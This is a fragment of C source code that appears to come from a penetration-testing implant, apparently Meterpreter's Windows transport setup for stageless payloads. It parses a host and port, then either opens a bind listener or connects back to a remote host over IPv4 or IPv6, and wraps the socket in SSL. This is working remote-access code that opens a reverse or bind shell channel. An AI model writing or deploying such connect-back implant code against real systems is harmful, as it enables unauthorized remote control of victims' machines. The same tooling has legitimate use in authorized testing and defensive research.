			char* pScopeId = strrchr(pHost, '?') + 1;
			*(pScopeId - 1) = '\0';
			*(pPort - 1) = '\0';
			dprintf("[STAGELESS] IPv6 host %s port %S scopeid %S", pHost, pPort, pScopeId);
			result = reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, &ctx->fd);
		}
		else
		{
			u_short usPort = (u_short)atoi(pPort);

			// if no host is specified, then we can assume that this is a bind payload, otherwise
			// we'll assume that the payload is a reverse_tcp one and the given host is valid
			if (*pHost == ':')
			{
				dprintf("[STAGELESS] IPv4 bind port %s", pPort);
				result = bind_tcp(usPort, &ctx->fd);
			}
			else
			{
				*(pPort - 1) = '\0';
				dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
				result = reverse_tcp4(pHost, usPort, iRetryAttempts, &ctx->fd);
			}
		}
	}
	else
	{
		// assume that we have been given a valid socket given that there's no stageless information
		ctx->fd = socket;
	}

	if (result != ERROR_SUCCESS)
	{
		return FALSE;
	}

	// Do not allow the file descriptor to be inherited by child processes
	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);

	dprintf("[SERVER] Flushing the socket handle...");
	server_socket_flush(remote);

	dprintf("[SERVER] Initializing SSL...");
	if (!server_initialize_ssl(remote))
	{
		return FALSE;
	}

	dprintf("[SERVER] Negotiating SSL...");
	if (!server_negotiate_ssl(remote))
	{
		return FALSE;
	}

	return TRUE;
}
